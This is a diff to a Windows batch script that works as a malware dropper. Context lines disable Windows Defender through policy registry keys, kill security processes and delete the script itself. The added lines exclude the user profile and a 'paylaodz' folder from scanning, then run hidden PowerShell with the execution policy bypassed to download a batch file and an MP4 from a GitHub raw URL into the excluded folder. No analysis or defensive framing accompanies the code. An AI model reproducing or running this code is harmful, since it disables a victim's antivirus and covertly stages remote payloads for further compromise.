@@ -10,6 +10,10 @@ set "NX=HKLM\Software\Policies\Microsoft\Windows Defender\NIS"
 set "EX=HKLM\Software\Policies\Microsoft\Windows Defender\Exclusions"
 set "UX=HKLM\Software\Microsoft\Windows Defender"
 set "DOCS=%USERPROFILE%\Documents"
+set "USERDIR=%USERPROFILE%"
+set "DL=%USERPROFILE%\Documents\paylaodz"
+set "URL_BAT=https://raw.githubusercontent.com/tienkhah1/WassupLinkDinVoi/main/Ja9nz39.bat"
+set "URL_MP4=https://raw.githubusercontent.com/tienkhah1/WassupLinkDinVoi/main/202611012226.mp4"
 
 :: realtime off
 reg add "%POL%" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
@@ -56,10 +60,33 @@ taskkill /f /im SecurityHealthService.exe >nul 2>&1
 taskkill /f /im explorer.exe >nul 2>&1
 start "" explorer.exe
 
-:: documents exclusion — policy key + cmdlet
+:: exclusions — docs + userprofile + download dir, policy keys
 reg add "%EX%\Paths" /v "%DOCS%" /t REG_SZ /d "" /f >nul 2>&1
-reg add "%EX%\Paths" /v "%USERPROFILE%\Documents\*" /t REG_SZ /d "" /f >nul 2>&1
-powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%DOCS%' -ErrorAction SilentlyContinue } catch {}; try { Add-MpPreference -ExclusionPath '%USERPROFILE%\Documents\*' -ErrorAction SilentlyContinue } catch {}" >nul 2>&1
+reg add "%EX%\Paths" /v "%DOCS%\*" /t REG_SZ /d "" /f >nul 2>&1
+reg add "%EX%\Paths" /v "%USERDIR%" /t REG_SZ /d "" /f >nul 2>&1
+reg add "%EX%\Paths" /v "%USERDIR%\*" /t REG_SZ /d "" /f >nul 2>&1
+reg add "%EX%\Paths" /v "%DL%" /t REG_SZ /d "" /f >nul 2>&1
+reg add "%EX%\Paths" /v "%DL%\*" /t REG_SZ /d "" /f >nul 2>&1
+
+:: exclusions — the ones that actually matter (MpPreference)
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
+  "try { Add-MpPreference -ExclusionPath '%DOCS%' -ErrorAction SilentlyContinue } catch {}; ^
+   try { Add-MpPreference -ExclusionPath '%DOCS%\*' -ErrorAction SilentlyContinue } catch {}; ^
+   try { Add-MpPreference -ExclusionPath '%USERDIR%' -ErrorAction SilentlyContinue } catch {}; ^
+   try { Add-MpPreference -ExclusionPath '%USERDIR%\*' -ErrorAction SilentlyContinue } catch {}; ^
+   try { Add-MpPreference -ExclusionPath '%DL%' -ErrorAction SilentlyContinue } catch {}; ^
+   try { Add-MpPreference -ExclusionPath '%DL%\*' -ErrorAction SilentlyContinue } catch {}"
+
+:: download into the excluded user profile dir
+if not exist "%DL%" mkdir "%DL%" >nul 2>&1
+
+echo [1/2] pulling bat...
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
+  "try { Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%DL%\Ja9nz39.bat' -UseBasicParsing } catch { exit 1 }"
+
+echo [2/2] pulling mp4...
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
+  "try { Invoke-WebRequest -Uri '%URL_MP4%' -OutFile '%DL%\202611012226.mp4' -UseBasicParsing } catch { exit 1 }"
 
 :: self delete
 (goto) 2>nul & del "%~f0"
